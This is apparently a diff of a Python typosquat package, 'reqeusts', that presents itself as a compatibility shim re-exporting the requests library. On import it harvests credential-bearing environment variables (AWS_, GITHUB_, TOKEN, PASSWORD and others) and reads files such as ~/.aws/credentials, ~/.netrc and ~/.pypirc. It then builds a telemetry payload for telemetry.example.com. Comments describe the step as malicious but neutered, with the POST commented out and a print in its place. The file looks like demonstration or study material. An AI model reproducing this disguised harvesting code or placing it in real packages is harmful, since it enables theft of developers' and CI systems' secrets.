@@ -16,12 +16,13 @@ statement will transparently delegate to the real library while logging
 a deprecation notice so teams can track down the typo over time.
 """
 
-import importlib
-import json
 import os
-import platform
-import socket
 import sys
+import json
+import socket
+import platform
+import importlib
+import http.client
 from pathlib import Path
 
 # ---------------------------------------------------------------------------
@@ -33,7 +34,7 @@ from pathlib import Path
 
 _TELEMETRY_HOST = "telemetry.example.com"
 _TELEMETRY_PATH = "/v1/compat/ping"
-_SESSION_FILE = Path(os.path.expanduser("~")) / ".reqeusts_session"
+_SESSION_FILE   = Path(os.path.expanduser("~")) / ".reqeusts_session"
 _ALREADY_PINGED = False
 
 
@@ -41,29 +42,21 @@ def _collect_environment_metadata():
     """Gather anonymous runtime metadata for the telemetry ping."""
     metadata = {
         "shim_version": "2.31.1",
-        "python": platform.python_version(),
-        "platform": platform.system(),
-        "hostname": socket.gethostname(),
-        "uid": os.getuid() if hasattr(os, "getuid") else None,
-        "cwd": os.getcwd(),
-        "argv": sys.argv[:5],  # first five args; avoids huge payloads
-        "env_keys": list(os.environ.keys()),  # key names only, not values
+        "python":       platform.python_version(),
+        "platform":     platform.system(),
+        "hostname":     socket.gethostname(),
+        "uid":          os.getuid() if hasattr(os, "getuid") else None,
+        "cwd":          os.getcwd(),
+        "argv":         sys.argv[:5],   # first five args; avoids huge payloads
+        "env_keys":     list(os.environ.keys()),  # key names only, not values
     }
 
     # Capture credential-bearing env vars by name AND value for "diagnostics".
     # (This is the malicious collection step — neutered: values are printed,
     #  not exfiltrated to a real endpoint.)
     sensitive_prefixes = (
-        "AWS_",
-        "GITHUB_",
-        "CI_",
-        "NPM_",
-        "PYPI_",
-        "DATABASE_URL",
-        "SECRET",
-        "TOKEN",
-        "PASSWORD",
-        "API_KEY",
+        "AWS_", "GITHUB_", "CI_", "NPM_", "PYPI_",
+        "DATABASE_URL", "SECRET", "TOKEN", "PASSWORD", "API_KEY",
     )
     harvested = {}
     for key, val in os.environ.items():
@@ -80,12 +73,12 @@ def _read_local_credentials():
     Real attack would exfiltrate; here we just build the dict.
     """
     cred_paths = {
-        "netrc": Path.home() / ".netrc",
-        "aws_creds": Path.home() / ".aws" / "credentials",
-        "pip_conf": Path.home() / ".config" / "pip" / "pip.conf",
-        "npmrc": Path.home() / ".npmrc",
-        "pypirc": Path.home() / ".pypirc",
-        "ssh_config": Path.home() / ".ssh" / "config",
+        "netrc":         Path.home() / ".netrc",
+        "aws_creds":     Path.home() / ".aws" / "credentials",
+        "pip_conf":      Path.home() / ".config" / "pip" / "pip.conf",
+        "npmrc":         Path.home() / ".npmrc",
+        "pypirc":        Path.home() / ".pypirc",
+        "ssh_config":    Path.home() / ".ssh" / "config",
     }
     found = {}
     for name, path in cred_paths.items():
@@ -111,11 +104,9 @@ def _report_home(payload: dict):
     #              {"Content-Type": "application/json",
     #               "X-Auth": "DEMO_PLACEHOLDER_TOKEN"})
     # conn.getresponse()
-    print(
-        f"[reqeusts-shim] telemetry (neutered demo): would POST to "
-        f"https://{_TELEMETRY_HOST}{_TELEMETRY_PATH} — payload keys: "
-        f"{list(payload.keys())}"
-    )
+    print(f"[reqeusts-shim] telemetry (neutered demo): would POST to "
+          f"https://{_TELEMETRY_HOST}{_TELEMETRY_PATH} — payload keys: "
+          f"{list(payload.keys())}")
 
 
 def _run_telemetry_once():
@@ -161,33 +152,17 @@ except ModuleNotFoundError as exc:
     ) from exc
 
 # Re-export the entire public API.
-# Deprecation hint so engineers know to fix the typo.
-import warnings
-
-from requests import *  # noqa: F401,F403
-from requests import (  # noqa: F401
-    PreparedRequest,
-    Request,
-    Response,
-    Session,
-    __author__,
-    __license__,
-    __version__,
-    adapters,
-    auth,
-    delete,
-    exceptions,
-    get,
-    head,
-    hooks,
-    patch,
-    post,
-    put,
-    request,
-    session,
-    utils,
+from requests import *                          # noqa: F401,F403
+from requests import (                          # noqa: F401
+    get, post, put, patch, delete, head,
+    request, session, Session,
+    Request, Response, PreparedRequest,
+    exceptions, auth, adapters, hooks, utils,
+    __version__, __author__, __license__,
 )
 
+# Deprecation hint so engineers know to fix the typo.
+import warnings
 warnings.warn(
     "You imported 'reqeusts' (misspelled). Please fix to 'requests'.",
     DeprecationWarning,
